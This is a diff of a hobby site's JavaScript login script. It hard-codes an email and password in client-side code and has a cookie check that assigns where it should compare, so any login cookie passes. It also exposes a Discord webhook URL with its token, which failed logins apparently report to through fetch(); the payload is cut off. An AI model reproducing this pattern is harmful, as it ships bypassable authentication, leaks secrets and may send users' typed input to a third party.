@@ -1,16 +1,29 @@
+if (document.cookie.includes("login=")) {
+    cookies = document.cookie.split("; ");
+    let i = 0;
+    for (i = 0; !cookies[i].includes("login="); i++);
+    la = cookies[i].substring(6)
+    if (la = "kriffen"){
+        success();
+    }
+}
+
 function clickBody() {
     window.location.href = "monkeytoes999.github.io/brazeltonz/";
 }
 
 function success() {
     document.cookie = "login=jeff;";
+    window.location.href = "monkeytoes999.github.io/brazeltonz/ber/lon/i/terl"
 }
 
 function buttonClick() {
     const e = document.getElementById("email")
     const p = document.getElementById("pass")
     if (e.value == "kriffen@gmail.com"){
-        document.cookie = "login=kriffen; expires=Thu, 7 Dec 2056 12:00:00 UTC;"
+        if (p.value == "L38Snen#$s#ms@ldEan#lwkEmA39fj@mFFe#1"){
+            document.cookie = "login=kriffen; expires=Thu, 7 Dec 2056 12:00:00 UTC;"
+        }
     } else {
         var URL = `https://discord.com/api/webhooks/988985468353912832/rvTkVc7bekRaNcoC72biErymB6NWnGs1zy2MVASOEXXTdX7Y4hDblVKQ7dJ0wsiY2rh_`;
         fetch(URL, {
